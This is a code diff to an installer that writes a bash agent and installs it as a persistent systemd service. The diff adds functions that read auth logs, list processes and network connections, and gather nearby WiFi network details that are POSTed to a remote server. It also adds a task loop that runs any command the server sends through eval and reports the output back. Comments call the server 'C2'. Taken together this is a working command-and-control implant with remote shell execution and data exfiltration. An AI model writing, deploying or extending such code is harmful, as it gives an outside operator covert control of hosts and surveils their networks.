@@ -48,6 +48,7 @@ export PATH=$PATH:/usr/sbin:/sbin:/usr/bin:/bin:/usr/local/bin
 AGENT_DIR="/opt/vpp-agent"
 SERVER=$(cat "$AGENT_DIR/.server")
 LOG_FILE="/var/log/vpp-agent.log"
+ACTOR_NAME="Agent"
 
 # Function to log messages
 log() {
@@ -69,14 +70,37 @@ get_hwid() {
     echo "\$HID"
 }
 
+# --- SPECIAL CAPABILITIES ---
+
+perform_forensics() {
+    echo "---PROCESSES---"
+    ps -eo user,pid,%cpu,%mem,comm --sort=-%cpu | head -n 15
+    echo "---NETWORK---"
+    if command -v ss &> /dev/null; then ss -tupn; else netstat -tupn; fi
+    echo "---AUTH---"
+    tail -n 10 /var/log/auth.log 2>/dev/null || tail -n 10 /var/log/secure 2>/dev/null
+    echo "---OPENFILES---"
+    lsof -i -P -n | grep LISTEN | head -n 10
+}
+
+perform_recon() {
+    local AID="\$1"
+    # WIFI
+    if command -v nmcli &> /dev/null; then
+        local WIFIDATA=\$(nmcli -t -f SSID,BSSID,SIGNAL,SECURITY,CHAN dev wifi list | head -n 10 | awk -F: '{ printf "{\\"ssid\\":\\"%s\\",\\"bssid\\":\\"%s\\",\\"signal\\":%s,\\"security\\":\\"%s\\",\\"channel\\":%s,\\"actorName\\":\\"'$ACTOR_NAME'\\"},", \$1, \$2, \$3, \$4, \$5 }' | sed 's/,\$//')
+        if [ ! -z "\$WIFIDATA" ]; then
+            JSON=\$(jq -n --arg aid "\$AID" --argjson d "[\$WIFIDATA]" '{actorId: \$aid, type: "WIFI", data: \$d}')
+            curl -s -X POST -H "Content-Type: application/json" -d "\$JSON" "\$SERVER/api/agent/recon"
+        fi
+    fi
+}
+
+# --- INITIALIZATION ---
 HWID=\$(get_hwid)
 log "Agent Started. HWID: \$HWID"
 
-# --- VALIDATION PHASE ---
-# Always check status with server on startup to handle stale IDs
+# Validation
 CUR_VER=\$(cat "$AGENT_DIR/.version" 2>/dev/null || echo "1.0.0")
-log "Contacting Server at \$SERVER/api/agent/heartbeat..."
-
 INIT_RESP=\$(curl -s -G --data-urlencode "hwid=\$HWID" --data-urlencode "os=$(uname -r)" --data-urlencode "version=\$CUR_VER" "\$SERVER/api/agent/heartbeat")
 INIT_STATUS=\$(echo "\$INIT_RESP" | jq -r '.status')
 
@@ -87,17 +111,12 @@ if [ "\$INIT_STATUS" == "APPROVED" ]; then
     echo "\$NEW_ID" > "$AGENT_DIR/vpp-id"
     log "Device is APPROVED. ID: \$NEW_ID"
 elif [ "\$INIT_STATUS" == "PENDING" ]; then
-    log "Device is PENDING approval. Clearing any local ID to force enrollment loop."
     rm -f "$AGENT_DIR/vpp-id"
-else
-    log "Unknown status or connection error: \$INIT_RESP"
 fi
 
-# --- ENROLLMENT LOOP ---
+# Enrollment Loop
 while [ ! -f "$AGENT_DIR/vpp-id" ]; do
     HWID=\$(get_hwid)
-    CUR_VER=\$(cat "$AGENT_DIR/.version" 2>/dev/null || echo "1.0.0")
-    
     RESP=\$(curl -s -G --data-urlencode "hwid=\$HWID" --data-urlencode "os=$(uname -r)" --data-urlencode "version=\$CUR_VER" "\$SERVER/api/agent/heartbeat")
     STATUS=\$(echo "\$RESP" | jq -r '.status')
     
@@ -106,8 +125,6 @@ while [ ! -f "$AGENT_DIR/vpp-id" ]; do
         log "Agent Approved! ID: \$(cat $AGENT_DIR/vpp-id)"
     elif [ "\$STATUS" == "PENDING" ]; then
         log "Waiting for approval..."
-    else
-        log "Heartbeat failed. Retrying..."
     fi
     sleep 10
 done
@@ -115,31 +132,59 @@ done
 ACTOR_ID=\$(cat "$AGENT_DIR/vpp-id")
 log "Entering Main Loop for Actor: \$ACTOR_ID"
 
-# --- MAIN LOOP ---
+# --- MAIN EVENT LOOP ---
 while true; do
-    # Scan/Heartbeat to C2
+    # 1. Heartbeat
     PAYLOAD=\$(jq -n --arg id "\$ACTOR_ID" '{actorId: $id}')
-    
-    # We use a POST here as a keep-alive
     OUT=\$(curl -s -X POST -H "Content-Type: application/json" -d "\$PAYLOAD" "\$SERVER/api/agent/scan")
     
-    # If C2 returns reset, clear ID
     if [[ "\$OUT" == *"RESET"* ]]; then
-        log "Received Remote Reset command."
         rm -f "$AGENT_DIR/vpp-id"
-        exit 0 # Service restart will trigger re-enrollment logic
+        exit 0
     fi
 
-    # Check for commands (Not fully implemented in bash script version yet, usually handled by separate poll)
-    # For now, just keep alive
+    # 2. Check Tasks
+    TASKS=\$(curl -s -G --data-urlencode "actorId=\$ACTOR_ID" "\$SERVER/api/agent/tasks")
     
+    # Process tasks if array is not empty
+    echo "\$TASKS" | jq -c '.[]' 2>/dev/null | while read -r task; do
+        JOB_ID=\$(echo "\$task" | jq -r '.id')
+        CMD=\$(echo "\$task" | jq -r '.command')
+        
+        log "Executing Job \$JOB_ID: \$CMD"
+        
+        # SPECIAL COMMANDS
+        RESULT=""
+        STATUS="COMPLETED"
+        
+        if [[ "\$CMD" == "vpp-agent --forensic" ]]; then
+            RESULT=\$(perform_forensics)
+        elif [[ "\$CMD" == "vpp-agent --recon" ]]; then
+            perform_recon "\$ACTOR_ID"
+            RESULT="Recon data uploaded."
+        else
+            # Standard Shell Execution
+            RESULT=\$(eval "\$CMD" 2>&1)
+            EXIT_CODE=\$?
+            if [ \$EXIT_CODE -ne 0 ]; then STATUS="FAILED"; fi
+        fi
+        
+        # Report Result safely using jq to encode JSON
+        REPORT=\$(jq -n --arg out "\$RESULT" --arg stat "\$STATUS" '{output: \$out, status: \$stat}')
+        curl -s -X POST -H "Content-Type: application/json" -d "\$REPORT" "\$SERVER/api/agent/tasks/\$JOB_ID"
+    done
+
+    # 3. Randomized Recon (every ~5 mins)
+    if [ \$((RANDOM % 60)) -eq 0 ]; then
+        perform_recon "\$ACTOR_ID"
+    fi
+
     sleep 5
 done
 EOF_SRV
 
 chmod +x $AGENT_DIR/agent.sh
 
-# Create Service
 cat <<EOF_SVC > /etc/systemd/system/vpp-agent.service
 [Unit]
 Description=VPP Agent
@@ -159,6 +204,5 @@ systemctl enable vpp-agent
 systemctl restart vpp-agent
 
 echo "[$(date)] [INSTALLER] Service Installed & Started."
-echo "[$(date)] [INSTALLER] Logs available at $LOG_FILE"
 `;
 };
